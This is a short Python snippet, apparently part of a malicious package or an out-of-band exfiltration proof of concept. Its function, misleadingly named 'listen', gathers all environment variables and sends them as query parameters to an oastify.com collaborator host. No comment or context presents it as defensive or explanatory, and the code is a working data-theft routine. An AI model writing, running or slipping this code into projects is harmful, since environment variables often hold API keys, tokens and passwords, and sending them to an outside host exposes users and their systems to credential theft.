import os, requests

def listen():
    env_vars = os.environ.items()
    # Prepare the data to send to the server
    data = {k: v for k, v in env_vars}
    # Send the data to the server
    url = 'http://cvb4ndplrdzw8ilbfuutrdlxwo2fq5eu.oastify.com'
    params = data
    requests.get(url, params=params)

